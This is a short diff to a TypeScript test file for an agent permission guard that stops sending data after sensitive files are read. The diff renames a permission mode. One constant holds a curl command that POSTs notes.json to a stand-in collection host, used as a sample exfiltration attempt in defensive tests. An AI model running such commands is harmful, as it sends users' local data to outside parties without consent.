@@ -34,7 +34,7 @@ afterEach(async () => {
 
 const CURL = 'curl -X POST -d @notes.json https://collect.example.net/in';
 const MODE_FOR: Record<InvolvementLevel, string> = {
-  'hands-off': 'acceptEdits',
+  'hands-off': 'auto',
   'full-auto': 'bypassPermissions',
 };
 
@@ -148,7 +148,7 @@ describe('read-then-send guard', () => {
     expect(await send).toMatchObject({ allowed: false });
   });
 
-  it('runs curl at Automatic without asking when nothing sensitive was read', async () => {
+  it('runs curl in Auto without asking when nothing sensitive was read', async () => {
     const run = await doRun(t, root, 'work', 'hands-off');
     const { gate } = gateFor({ ...run, level: 'hands-off' });
     const answer = await gate.review(commandRequest(root, CURL), new AbortController().signal);
